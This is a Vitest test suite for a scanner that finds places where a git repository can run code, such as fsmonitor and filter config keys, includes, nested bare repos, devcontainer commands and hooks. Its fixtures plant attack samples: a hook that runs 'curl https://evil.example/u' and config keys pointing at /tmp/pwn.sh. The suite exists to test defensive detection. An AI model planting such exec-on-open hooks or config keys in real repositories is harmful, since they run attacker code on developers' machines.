import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { gitConfigEntries, repoFindings, repoSurface } from '../../src/exposure/repo-surface.js';

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function repo(files: Record<string, string> = {}): string {
  const root = mkdtempSync(join(tmpdir(), 'stroq-repo-surface-'));
  dirs.push(root);
  mkdirSync(join(root, '.git'), { recursive: true });
  writeFileSync(join(root, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
  for (const [name, content] of Object.entries(files)) {
    const path = join(root, name);
    mkdirSync(join(path, '..'), { recursive: true });
    writeFileSync(path, content);
  }
  return root;
}

const kinds = (root: string, group: 'preTrust' | 'onOpen') =>
  repoSurface(root)[group].map((h) => h.kind);

describe('gitConfigEntries', () => {
  it('reads plain and named sections into dotted keys', () => {
    const entries = gitConfigEntries(
      '[core]\n\tfsmonitor = /tmp/x.sh\n[filter "lfs"]\n\tclean = git-lfs clean\n# comment\n',
    );
    expect(entries).toEqual([
      { key: 'core.fsmonitor', value: '/tmp/x.sh' },
      { key: 'filter.lfs.clean', value: 'git-lfs clean' },
    ]);
  });

  it('survives a config it cannot fully parse rather than throwing', () => {
    expect(gitConfigEntries('nonsense\n[unclosed\n= 3\n')).toEqual([]);
  });
});

describe('repoSurface — what a repository can run', () => {
  it('reports nothing outside a git repository', () => {
    const root = mkdtempSync(join(tmpdir(), 'stroq-not-a-repo-'));
    dirs.push(root);
    expect(repoSurface(root)).toMatchObject({ isRepo: false, preTrust: [], onOpen: [] });
  });

  it('finds an exec-on-read git config key', () => {
    const root = repo();
    writeFileSync(join(root, '.git', 'config'), '[core]\n\tfsmonitor = /tmp/pwn.sh\n');
    expect(kinds(root, 'preTrust')).toEqual(['git-config-exec']);
    const [finding] = repoFindings(repoSurface(root));
    expect(finding?.severity).toBe('critical');
    expect(finding?.detail).toContain('core.fsmonitor');
  });

  // git's own built-in file monitor. Reporting it would put a critical finding on
  // every developer who turned the feature on, which is how a check loses its meaning.
  it('does not report core.fsmonitor set to a boolean', () => {
    const root = repo();
    writeFileSync(join(root, '.git', 'config'), '[core]\n\tfsmonitor = true\n');
    expect(repoSurface(root).preTrust).toEqual([]);
  });

  it('ignores ordinary configuration', () => {
    const root = repo();
    writeFileSync(
      join(root, '.git', 'config'),
      '[core]\n\tautocrlf = input\n[user]\n\temail = dev@example.com\n[remote "origin"]\n\turl = git@github.com:a/b.git\n',
    );
    expect(repoSurface(root).preTrust).toEqual([]);
  });

  it('finds an include that can set those keys from outside the checkout', () => {
    const root = repo();
    writeFileSync(join(root, '.git', 'config'), '[include]\n\tpath = ../../.evil/config\n');
    expect(kinds(root, 'preTrust')).toEqual(['git-config-include']);
  });

  it('finds a nested bare repository committed as plain files', () => {
    const root = repo();
    const bare = join(root, 'docs', 'assets', 'archive');
    mkdirSync(join(bare, 'objects'), { recursive: true });
    mkdirSync(join(bare, 'refs'), { recursive: true });
    writeFileSync(join(bare, 'HEAD'), 'ref: refs/heads/main\n');
    const hit = repoSurface(root).preTrust.find((h) => h.kind === 'nested-bare-repo');
    expect(hit?.file).toBe(join('docs', 'assets', 'archive'));
  });

  it('does not mistake the repository’s own .git for a nested one', () => {
    const root = repo();
    mkdirSync(join(root, '.git', 'objects'), { recursive: true });
    mkdirSync(join(root, '.git', 'refs'), { recursive: true });
    writeFileSync(join(root, '.git', 'HEAD'), 'ref: refs/heads/main\n');
    expect(repoSurface(root).preTrust).toEqual([]);
  });

  it('reports a .gitattributes driver only when its command is defined here', () => {
    const root = repo({ '.gitattributes': '*.bin filter=pwn\n' });
    expect(repoSurface(root).preTrust).toEqual([]);
    writeFileSync(join(root, '.git', 'config'), '[filter "pwn"]\n\tclean = /tmp/pwn.sh\n');
    expect(kinds(root, 'preTrust').sort()).toEqual(['git-config-exec', 'gitattributes-driver']);
  });

  it('separates a devcontainer host command from one that runs in the container', () => {
    const root = repo({
      '.devcontainer/devcontainer.json':
        '{\n  // jsonc, comments and all\n  "initializeCommand": "./scripts/host.sh",\n  "postCreateCommand": "npm ci"\n}\n',
    });
    expect(kinds(root, 'preTrust')).toEqual(['devcontainer-host-command']);
    expect(kinds(root, 'onOpen')).toEqual(['devcontainer-command']);
  });

  // The whole point of the split: these are ordinary, so they are counted and listed
  // and never raised, because `stroq exposure` exits 1 on any finding.
  it('counts ordinary on-open execution without raising a finding', () => {
    const root = repo({
      '.husky/pre-commit': 'pnpm test\n',
      '.envrc': 'use flake\n',
      'package.json': '{"scripts":{"prepare":"husky","build":"tsc"}}',
    });
    const hooks = join(root, '.git', 'hooks');
    mkdirSync(hooks, { recursive: true });
    writeFileSync(join(hooks, 'pre-push'), '#!/bin/sh\nexit 0\n');
    chmodSync(join(hooks, 'pre-push'), 0o755);
    writeFileSync(join(hooks, 'pre-commit.sample'), '#!/bin/sh\n');
    chmodSync(join(hooks, 'pre-commit.sample'), 0o755);

    const surface = repoSurface(root);
    expect(surface.preTrust).toEqual([]);
    expect(repoFindings(surface)).toEqual([]);
    expect(kinds(root, 'onOpen').sort()).toEqual([
      'envrc',
      'git-hook',
      'husky-hook',
      'package-install-script',
    ]);
    expect(surface.onOpen.map((h) => h.what)).not.toContain('build');
  });
});

/**
 * Windows has no executable bit: every file there reads back as mode 0o666 (or 0o444
 * when read-only), so the POSIX test that decides whether a git hook is live answers
 * "no" for every hook on the platform. Git for Windows runs them anyway — it carries
 * its own `sh` and does not consult a bit the filesystem never had — so the check does
 * not merely mis-rank a hook there, it stops seeing hooks at all and `stroq inspect`
 * prints a repository with no on-open execution surface.
 *
 * The platform is injected rather than read, because this suite can only ever run on
 * one of the two.
 */
describe('git hooks, where the executable bit does not exist', () => {
  /** A hook file written the way Windows would have it: present, and not executable. */
  const repoWithPlainHook = (): string => {
    const root = repo();
    const hooks = join(root, '.git', 'hooks');
    mkdirSync(hooks, { recursive: true });
    writeFileSync(join(hooks, 'pre-commit'), '#!/bin/sh\ncurl https://evil.example/u\n');
    chmodSync(join(hooks, 'pre-commit'), 0o644);
    writeFileSync(join(hooks, 'pre-push.sample'), '#!/bin/sh\n');
    chmodSync(join(hooks, 'pre-push.sample'), 0o644);
    return root;
  };

  it('counts a non-executable hook on Windows, where git runs it regardless', () => {
    const surface = repoSurface(repoWithPlainHook(), 'win32');
    expect(surface.onOpen.map((h) => h.what)).toEqual(['pre-commit']);
    expect(surface.onOpen[0]?.kind).toBe('git-hook');
  });

  it('still ignores the .sample hooks git ships, which are not installed anywhere', () => {
    expect(repoSurface(repoWithPlainHook(), 'win32').onOpen.map((h) => h.file)).not.toContain(
      '.git/hooks/pre-push.sample',
    );
  });

  // The POSIX side is unchanged: there the bit is real, an unset one means git will
  // not run the file, and reporting it would be a finding on a leftover nobody uses.
  it('keeps ignoring a non-executable hook on POSIX, where the bit means something', () => {
    expect(repoSurface(repoWithPlainHook(), 'linux').onOpen).toEqual([]);
  });

  // Windows cannot set the mode bit this test depends on; the Windows semantics have
  // their own cases above.
  it.skipIf(process.platform === 'win32')(
    'reports an executable hook on POSIX exactly as before',
    () => {
      const root = repoWithPlainHook();
      chmodSync(join(root, '.git', 'hooks', 'pre-commit'), 0o755);
      expect(repoSurface(root, 'linux').onOpen.map((h) => h.what)).toEqual(['pre-commit']);
    },
  );
});
